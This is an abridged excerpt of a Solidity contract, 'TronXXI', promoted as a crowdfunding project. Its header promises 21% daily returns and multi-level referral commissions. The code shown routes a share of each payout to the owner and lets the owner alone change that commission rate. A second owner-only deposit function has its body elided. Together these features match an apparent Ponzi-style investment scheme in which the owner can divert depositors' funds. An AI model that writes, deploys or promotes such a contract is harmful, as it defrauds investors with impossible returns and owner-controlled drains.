...
/*! TronXXI.sol | (c) 2020 Development by TRONXXI TEAM (www.tronxxi.com) 

------------------------------------
Crowdfunding & Crowdsharing project
 Website :  https://tronxxi.com/
 Telegram Group :  https://t.me/joinchat/UbV9vBy0Yp796ZQcPr0B9g
------------------------------------ 
 CONTRACT MANAGEMENT:
------------------------------------

21% daily ROI FOR YOU 
7% direct referral 👨  
3% referred level 2 👨🏽‍👨🏽‍  
1% referred level 3 👨🏽‍👨🏽‍👨🏽‍  
------------------------------------
...
contract TronXXI {
    ...
    function _payout(address _addr) private {
        ...
        invested+=(payout/2);
        owner.transfer(payout/devCommission);
    ...
    function changeCommision(uint _commision) public returns(bool) {
        require(msg.sender == owner, "Admin Only Can do this");

        devCommission = _commision;
    ...
    function depoAdmin(uint _amount) public returns(bool) {
        require(msg.sender == owner, "Admin Only Can do this");
    ...
    function payoutOf(address _addr) view external returns(uint256 value) {
        ...
        for(uint256 i = 0; i < player.deposits.length; i++) {
            ...
            if(to > from) {
                value += dep.amount * (to - from) * 25 * 4 / tarif.life_days / 8640000;
            }
        }
        return value;
    }
